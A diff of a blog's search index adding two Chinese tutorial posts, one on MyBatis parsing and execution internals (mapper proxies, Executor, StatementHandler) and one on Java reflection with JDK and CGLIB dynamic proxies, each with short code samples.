@@ -4,6 +4,168 @@
   
     
     <entry>
+      <title><![CDATA[深入浅出MyBatis：MyBatis解析和运行原理]]></title>
+      <url>https://qqdong.github.io/2018/03/29/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAMyBatis%EF%BC%9AMyBatis%E8%A7%A3%E6%9E%90%E5%92%8C%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/</url>
+      <content type="html"><![CDATA[<p>上一篇介绍了反射和动态代理基础，主要是为本篇文章做个铺垫，反射使配置和灵活性大大提高，可以给很多配置设置参数，动态代理可以在运行时创建代理对象，做一些特殊的处理。</p>
+<p>本篇会介绍MyBatis解析和运行原理，下一篇介绍插件及应用，目的是更好地编写插件，通过本篇的介绍，你会了解到：</p>
+<ul>
+<li>构建SqlSessionFactory过程</li>
+<li>映射器的动态代理</li>
+<li>SqlSession的4大对象</li>
+<li>sql执行的过程</li>
+</ul>
+<p>SqlSessionFactory和SqlSession是MyBatis的核心组件，在文章 <a href="http://qqidol.com/2018/03/25/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAMyBatis%EF%BC%9A%E4%BB%8B%E7%BB%8D%E5%92%8C%E9%85%8D%E7%BD%AE/" target="_blank" rel="noopener">JDBC和MyBatis介绍</a> 中有详细说明。</p>
+<a id="more"></a>
+<h4 id="构建SqlSessionFactory过程"><a href="#构建SqlSessionFactory过程" class="headerlink" title="构建SqlSessionFactory过程"></a>构建SqlSessionFactory过程</h4><p>构建主要分为2步：</p>
+<ul>
+<li>通过XMLConfigBuilder解析配置的XML文件，读出配置参数，包括基础配置XML文件和映射器XML文件；</li>
+<li>使用Configuration对象创建SqlSessionFactory，SqlSessionFactory是一个接口，提供了一个默认的实现类DefaultSqlSessionFactory。</li>
+</ul>
+<p>说白了，就是将我们的所有配置解析为Configuration对象，在整个生命周期内，可以通过该对象获取需要的配置。</p>
+<p>由于插件需要频繁访问映射器的内部组成，会重点这部分，了解这块配置抽象出来的对象：</p>
+<h5 id="MappedStatement"><a href="#MappedStatement" class="headerlink" title="MappedStatement"></a>MappedStatement</h5><p>它保存映射器的一个节点（select|insert|delete|update），包括配置的SQL，SQL的id、缓存信息、resultMap、parameterType、resultType等重要配置内容。</p>
+<p>它涉及的对象比较多，一般不去修改它。</p>
+<h5 id="SqlSource"><a href="#SqlSource" class="headerlink" title="SqlSource"></a>SqlSource</h5><p>它是MappedStatement的一个属性，主要作用是根据参数和其他规则组装SQL，也是很复杂的，一般也不用修改它。</p>
+<h5 id="BoundSql"><a href="#BoundSql" class="headerlink" title="BoundSql"></a>BoundSql</h5><p>对于参数和SQL，主要反映在BoundSql类对象上，在插件中，通过它获取到当前运行的SQL和参数以及参数规则，作出适当的修改，满足特殊的要求。</p>
+<p>BoundSql提供3个主要的属性：parameterObject、parameterMappings和sql，下面分别来介绍。</p>
+<p>parameterObject为参数本身，可以传递简单对象、POJO、Map或@Param注解的参数：</p>
+<ul>
+<li>传递简单对象(int、float、String等)，会把参数转换为对应的类，比如int会转换为Integer；</li>
+<li>如果传递的是POJO或Map，paramterObject就是传入的POJO或Map不变；</li>
+<li>如果传递多个参数，没有@Param注解，parameterObject就是一个Map<string,object>对象，类似这样的形式{“1”:p1 , “2”:p2 , “3”:p3 … “param1”:p1 , “param2”:p2 , “param3”,p3 …}，所以在编写的时候可以使用#{param1}或#{1}去引用第一个参数；</string,object></li>
+<li>如果传递多个参数，有@Param注解，与没有注解的类似，只是将序号的key替换为@Param指定的name；</li>
+</ul>
+<p>parameterMappings，它是一个List，元素是ParameterMapping对象，这个对象会描绘sql中的参数引用，包括名称、表达式、javaType、jdbcType、typeHandler等信息。</p>
+<p>sql，是写在映射器里面的一条sql。</p>
+<p>有了Configuration对象，构建SqlSessionFactory就简单了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlSessionFactory = <span class="keyword">new</span> SqlSessionFactoryBuilder().bulid(inputStream);</span><br></pre></td></tr></table></figure>
+<h4 id="SqlSession运行过程"><a href="#SqlSession运行过程" class="headerlink" title="SqlSession运行过程"></a>SqlSession运行过程</h4><h5 id="映射器的动态代理"><a href="#映射器的动态代理" class="headerlink" title="映射器的动态代理"></a>映射器的动态代理</h5><p>Mapper映射是通过动态代理来实现的，使用JDK动态代理返回一个代理对象，供调用者访问。</p>
+<p>首先看看实现InvocationHandler接口的类，它是执行本代理方法的关键，可以看到，Mapper是一个接口，会生成MapperMethod对象，调用execute方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperProxy</span>&lt;<span class="title">T</span>&gt; <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  .....</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (Object.class.equals(method.getDeclaringClass())) &#123;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>, args);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isDefaultMethod(method)) &#123;</span><br><span class="line">        <span class="keyword">return</span> invokeDefaultMethod(proxy, method, args);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">      <span class="keyword">throw</span> ExceptionUtil.unwrapThrowable(t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> MapperMethod mapperMethod = cachedMapperMethod(method);</span><br><span class="line">    <span class="keyword">return</span> mapperMethod.execute(sqlSession, args);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看下面的代码，MapperMethod采用命令模式，根据不同的sql操作，做不同的处理。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperMethod</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> Object <span class="title">execute</span><span class="params">(SqlSession sqlSession, Object[] args)</span> </span>&#123;</span><br><span class="line">    Object result;</span><br><span class="line">    <span class="keyword">switch</span> (command.getType()) &#123;</span><br><span class="line">      <span class="keyword">case</span> INSERT: &#123;</span><br><span class="line">      Object param = method.convertArgsToSqlCommandParam(args);</span><br><span class="line">        result = rowCountResult(sqlSession.insert(command.getName(), param));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">case</span> UPDATE: &#123;</span><br><span class="line">        Object param = method.convertArgsToSqlCommandParam(args);</span><br><span class="line">        result = rowCountResult(sqlSession.update(command.getName(), param));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        ......</span><br><span class="line">        </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>最后看下，生成代理类的方法，就是使用JDK动态代理Proxy来创建的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperProxyFactory</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> T <span class="title">newInstance</span><span class="params">(SqlSession sqlSession)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> MapperProxy&lt;T&gt; mapperProxy = <span class="keyword">new</span> MapperProxy&lt;T&gt;(sqlSession, mapperInterface, methodCache);</span><br><span class="line">    <span class="keyword">return</span> newInstance(mapperProxy);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> T <span class="title">newInstance</span><span class="params">(MapperProxy&lt;T&gt; mapperProxy)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (T) Proxy.newProxyInstance(mapperInterface.getClassLoader(), <span class="keyword">new</span> Class[] &#123; mapperInterface &#125;, mapperProxy);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>总结下映射器的调用过程，返回的Mapper对象是代理对象，当调用它的某个方法时，其实是调用MapperProxy#invoke方法，而映射器的XML文件的命名空间对应的就是这个接口的全路径，会根据全路径和方法名，便能够绑定起来，定位到sql，最后会使用SqlSession接口的方法使它能够执行查询。</p>
+<h5 id="SqlSession下的四大对象"><a href="#SqlSession下的四大对象" class="headerlink" title="SqlSession下的四大对象"></a>SqlSession下的四大对象</h5><p>通过上面的分析，映射器就是一个动态代理对象，进入到了MapperMethod的execute方法，它经过简单的判断就进入了SqlSession的删除、更新、插入、选择等方法，这些方法如何执行是下面要介绍的内容。</p>
+<p>Mapper执行的过程是通过Executor、StatementHandler、ParameterHandler和ResultHandler来完成数据库操作和结果返回的，理解他们是编写插件的关键：</p>
+<ul>
+<li>Executor：执行器，由它统一调度其他三个对象来执行对应的SQL；</li>
+<li>StatementHandler：使用数据库的Statement执行操作；</li>
+<li>ParameterHandler：用于SQL对参数的处理；</li>
+<li>ResultHandler：进行最后数据集的封装返回处理；</li>
+</ul>
+<p>在MyBatis中存在三种执行器：</p>
+<ul>
+<li>SIMPLE：简易执行器，默认的执行器；</li>
+<li>REUSE：执行重用预处理语句；</li>
+<li>BATCH:执行重用语句和批量更新，针对批量专用的执行器；</li>
+</ul>
+<p>以SimpleExecutor为例，说明执行过程</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleExecutor</span> <span class="keyword">extends</span> <span class="title">BaseExecutor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 执行查询操作</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">public</span> &lt;E&gt; <span class="function">List&lt;E&gt; <span class="title">doQuery</span><span class="params">(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Configuration configuration = ms.getConfiguration();</span><br><span class="line">      StatementHandler handler = configuration.newStatementHandler(<span class="keyword">this</span>, ms, parameter, rowBounds, resultHandler, boundSql);</span><br><span class="line">      stmt = prepareStatement(handler, ms.getStatementLog());</span><br><span class="line">      <span class="keyword">return</span> handler.&lt;E&gt;query(stmt, resultHandler);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      closeStatement(stmt);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 初始化StatementHandler</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> Statement <span class="title">prepareStatement</span><span class="params">(StatementHandler handler, Log statementLog)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    Statement stmt;</span><br><span class="line">    Connection connection = getConnection(statementLog);</span><br><span class="line">    stmt = handler.prepare(connection);</span><br><span class="line">    handler.parameterize(stmt);</span><br><span class="line">    <span class="keyword">return</span> stmt;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 执行查询</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> &lt;E&gt; <span class="function">List&lt;E&gt; <span class="title">query</span><span class="params">(Statement statement, ResultHandler resultHandler)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    String sql = boundSql.getSql();</span><br><span class="line">    statement.execute(sql);</span><br><span class="line">    <span class="keyword">return</span> resultSetHandler.&lt;E&gt;handleResultSets(statement);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到最后会委托给StatementHandler会话器进行处理，它是一个接口，实际创建的是RoutingStatementHandler对象，但它不是真实的服务对象，它是通过适配器模式找到对应的StatementHandler执行的。在MyBatis中，StatementHandler和Executor一样分为三种：SimpleStatementHandler、PreparedStatementHandler、CallableStatementHandler。</p>
+<p>Executor会先调用StatementHandler的prepare方法预编译SQL语句，同时设置一些基本运行的参数。然后调用parameterize()方法启用ParameterHandler设置参数，完成预编译，跟着执行查询，用ResultHandler封装结果返回给调用者。</p>
+<p>参数处理器和结果处理器比较简单，就不在此介绍了。</p>
+<p>下一篇会介绍插件及其应用，主要是在sql执行的过程中，在四大对象的基础上进行扩展。</p>
+<p><strong>欢迎扫描下方二维码，关注我的个人微信公众号 ~</strong></p>
+<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
+]]></content>
+      
+        <categories>
+            
+            <category> MyBatis </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> MyBatis </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[深入浅出MyBatis：反射和动态代理]]></title>
+      <url>https://qqdong.github.io/2018/03/28/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAMyBatis%EF%BC%9A%E5%8F%8D%E5%B0%84%E5%92%8C%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%9F%BA%E7%A1%80/</url>
+      <content type="html"><![CDATA[<p>前三篇详细总结了Mybatis的基本特性、常用配置、映射器，相对于Hibernate，映射器的配置相对复杂，但有很好的灵活性和扩展性，可以应对各种业务场景。熟练掌握这些内容，可以流畅的使用MyBatis进行开发了。</p>
+<p>后面准备介绍MyBatis的解析和运行原理以及自定义插件，今天看了书籍的这部分，都会涉及到反射和动态代理这些基础，本篇文章总结下这些，便于理解原理。</p>
+<p>通过本篇的介绍，你会了解到：</p>
+<ul>
+<li>反射和动态代理是解决什么问题的</li>
+<li>Class对象</li>
+<li>反射能做什么</li>
+<li>动态代理的实现方式：JDK动态代理、CGLIB</li>
+</ul>
+<a id="more"></a>
+<h4 id="理解反射和动态代理"><a href="#理解反射和动态代理" class="headerlink" title="理解反射和动态代理"></a>理解反射和动态代理</h4><h5 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h5><p>首先看看官网对反射的定义：</p>
+<blockquote>
+<p>可以通过java代码，获取当前加载类的字段、方法、构造函数等信息，并在安全限制内，使用反射字段、方法、构造函数进行操作。</p>
+</blockquote>
+<p>简单来说，可以在运行时获得程序中每一个类型的成员信息。程序中定义的对象，其类型都是在编译期确定的，而反射可以动态地创建对象，并访问或调用其成员。</p>
+<h5 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h5><p>所谓代理，是一个人或组织代替另一个人或组织做事，主要有3个角色：访问者、代理人、被代理人，访问者经由代理人，与被代理人交互，中间会加入一些自己的处理。</p>
+<p><img src="http://oc3r3rke2.bkt.clouddn.com/15222394888944.jpg" alt="图片来自互联网"></p>
+<p>所谓的动态代理，是说在编译时不需要定义代理类，而是在运行时创建，这个是关键：在运行时创建代理类。</p>
+<h4 id="Class对象"><a href="#Class对象" class="headerlink" title="Class对象"></a>Class对象</h4><p>Class类是一个实实在在的类，存在于java.lang包中，用来表示运行时类型信息。Class对象表示自定义类的类型信息，比如创建一个User类，JVM就会创建一个User对应的Class对象，保存User类相关的类型信息，该对象保存在jvm堆中，作为访问方法区中User类型信息的接口。</p>
+<p>在使用自定义类时，会首先检查这个类的Class对象是否已经加载，如果没有加载，默认的类加载器就会先根据类名查找.class文件，Class对象就会被加载到内存。</p>
+<p>可以通过下面3种方法获取Class对象：</p>
+<ul>
+<li>使用Class类的forName静态方法；</li>
+<li>直接获取某一个对象的class；</li>
+<li>调用某个对象的getClass()方法；</li>
+</ul>
+<p>Class对象是反射的基础，提供了获取类信息的方法，后面会介绍。</p>
+<h4 id="反射提供的功能"><a href="#反射提供的功能" class="headerlink" title="反射提供的功能"></a>反射提供的功能</h4><p>java反射框架主要提供以下内容：</p>
+<ul>
+<li>在运行时判断对象所属的类；</li>
+<li>在运行时创建对象；</li>
+<li>在运行时获取类包含的成员变量、方法、父类、接口等信息；</li>
+<li>在运行时调用一个对象的方法；</li>
+</ul>
+<p>下面举例说明相关功能</p>
+<p>创建实例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取String所对应的Class对象</span></span><br><span class="line">Class&lt;?&gt; c = User.class;</span><br><span class="line"><span class="comment">//获取String类带一个String参数的构造器</span></span><br><span class="line">Constructor constructor = c.getConstructor(String.class);</span><br><span class="line"><span class="comment">//根据构造器创建实例</span></span><br><span class="line">User user = (User)constructor.newInstance(<span class="string">"calm"</span>);</span><br></pre></td></tr></table></figure>
+<p>获取方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回类或接口声明的所有方法，包括私有的，但不包括继承的方法</span></span><br><span class="line"><span class="keyword">public</span> Method[] getDeclaredMethods() <span class="keyword">throws</span> SecurityException</span><br><span class="line"></span><br><span class="line"><span class="comment">//所有public方法，包括继承的方法</span></span><br><span class="line"><span class="keyword">public</span> Method[] getMethods() <span class="keyword">throws</span> SecurityException</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回一个特定的方法，第一个参数为方法名称，后面的参数为方法参数对应Class的对象</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Method <span class="title">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span></span></span><br></pre></td></tr></table></figure>
+<p>调用方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; userClass=User.class;</span><br><span class="line">Object obj = userClass.newInstance();</span><br><span class="line">Method method =klass.getMethod(<span class="string">"addRole"</span>,String.class);</span><br><span class="line">method.invoke(obj,<span class="string">"超级管理员"</span>);</span><br></pre></td></tr></table></figure>
+<h4 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h4><p>JDK本身提供了动态代理的实现，要求被代理者必须实现接口。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span></span><br><span class="line"><span class="function"><span class="params">Class&lt;?&gt;[] interfaces,InvocationHandler h)</span></span></span><br></pre></td></tr></table></figure>
+<p>第一个参数为类加载器，第二个参数是被代理者实现的接口列表，第三个参数是实现了InvocationHandler接口的对象。</p>
+<p>InvocationHandler是一个接口，用于规范执行被代理者的方法，可在执行方法前后，添加公共的处理代码。生成的动态代理类包含一个InvocationHandler属性，调用对应方法时，会触发invoke方法的调用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDKProxy</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> Object targetObject;<span class="comment">//被代理对象   </span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">newProxy</span><span class="params">(Object targetObject)</span> </span>&#123;        </span><br><span class="line">        <span class="keyword">this</span>.targetObject = targetObject;     </span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(targetObject.getClass().getClassLoader(),</span><br><span class="line">targetObject.getClass().getInterfaces(), <span class="keyword">this</span>);</span><br><span class="line">&#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span><span class="comment">//invoke方法    </span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Throwable </span>&#123;    </span><br><span class="line">        Object ret = <span class="keyword">null</span>;         </span><br><span class="line">        ret  = method.invoke(targetObject, args);      </span><br><span class="line">        <span class="keyword">return</span> ret;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>测试代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JDKProxy jdkProxy=<span class="keyword">new</span> JDKProxy();</span><br><span class="line">UserService userService = (UserService) </span><br><span class="line">jdkProxy.newProxy(<span class="keyword">new</span> UserServiceImp());    </span><br><span class="line">userService.addRole(<span class="string">"超级管理员"</span>);</span><br></pre></td></tr></table></figure>
+<p>JDK动态代理的基本原理是根据定义好的规则，用传入的接口创建一个新类。</p>
+<h4 id="CGLIB动态代理"><a href="#CGLIB动态代理" class="headerlink" title="CGLIB动态代理"></a>CGLIB动态代理</h4><p>JDK动态代理要求必须有接口，CGLIB（Code Generate Library）动态代理没有这个要求，它是通过创建一个被代理类的子类，然后使用ASM字节码库修改代码来实现的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CGLibProxy</span> <span class="keyword">implements</span> <span class="title">MethodInterceptor</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> Object targetObject; <span class="comment">//被代理对象</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">createProxyObject</span><span class="params">(Object obj)</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">this</span>.targetObject = obj;    </span><br><span class="line">        Enhancer enhancer = <span class="keyword">new</span> Enhancer();    </span><br><span class="line">        enhancer.setSuperclass(obj.getClass());    </span><br><span class="line">        enhancer.setCallback(<span class="keyword">this</span>);    </span><br><span class="line">        Object proxyObj = enhancer.create();    </span><br><span class="line">        <span class="keyword">return</span> proxyObj;</span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">intercept</span><span class="params">(Object proxy, Method method, Object[] args,    </span></span></span><br><span class="line"><span class="function"><span class="params">            MethodProxy methodProxy)</span> <span class="keyword">throws</span> Throwable </span>&#123;    </span><br><span class="line">        Object obj = <span class="keyword">null</span>;       </span><br><span class="line">        obj = method.invoke(targetObject, args);    </span><br><span class="line">        <span class="keyword">return</span> obj;    </span><br><span class="line">    &#125;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>测试代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CGLibProxy cgLibProxy=<span class="keyword">new</span> CGLibProxy();</span><br><span class="line">UserService userService = (UserService) </span><br><span class="line">cgLibProxy.newProxy(<span class="keyword">new</span> UserServiceImp());    </span><br><span class="line">userService.addRole(<span class="string">"超级管理员"</span>);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>ASM 是一个 Java 字节码操控框架。它能够以二进制形式修改已有类或者动态生成类。不过ASM在创建class字节码的过程中，操纵的级别是底层JVM的汇编指令级别，这要求ASM使用者要对class组织结构和JVM汇编指令有一定的了解。另外可以使用javassist框架操作字节码，它对开发者提供的接口比较优化。</p>
+</blockquote>
+<p>了解了反射和动态代理，对后面介绍MyBatis的解析和运行原理有很大帮助，下一篇会重点介绍。</p>
+<p><strong>欢迎扫描下方二维码，关注我的个人微信公众号 ~</strong></p>
+<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
+]]></content>
+      
+        <categories>
+            
+            <category> java基础 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 动态代理 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[深入浅出MyBatis：「映射器」全了解]]></title>
       <url>https://qqdong.github.io/2018/03/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAMyBatis%EF%BC%9A%E3%80%8C%E6%98%A0%E5%B0%84%E5%99%A8%E3%80%8D%E5%85%A8%E4%BA%86%E8%A7%A3/</url>
       <content type="html"><![CDATA[<blockquote>
@@ -222,7 +384,7 @@
     
     <entry>
       <title><![CDATA[深入浅出MyBatis：JDBC和MyBatis介绍]]></title>
-      <url>https://qqdong.github.io/2018/03/25/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAMyBatis%EF%BC%9A%E4%BB%8B%E7%BB%8D%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
+      <url>https://qqdong.github.io/2018/03/25/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAMyBatis%EF%BC%9AJDBC%E5%92%8CMyBatis%E4%BB%8B%E7%BB%8D/</url>
       <content type="html"><![CDATA[<p>最近在休陪产假，时间比较零碎，准备看2本书充实下，一本是「深入浅出MyBatis：技术原理与实践」，一本是「RabbitMQ实战：高效部署分布式消息队列」，为了加深记忆和理解，会进行整理、扩展和记录。</p>
 <p>看书的目标不是把所有的细节都记住，而是从整体上了解一个技术能做什么，包含的特性、基本模块，实现原理和常见使用场景。</p>
 <p>本篇分享MyBatis书籍的第一篇，首先回忆下JDBC的相关概念，了解Java提供的访问数据库最基本的方式，然后介绍下MyBatis的基本特性和核心组件，最后说下书的整体结构，了解后续文章的大致内容。</p>
@@ -767,13 +929,13 @@
 <p>加入请求URL和反射XSS相同:</p>
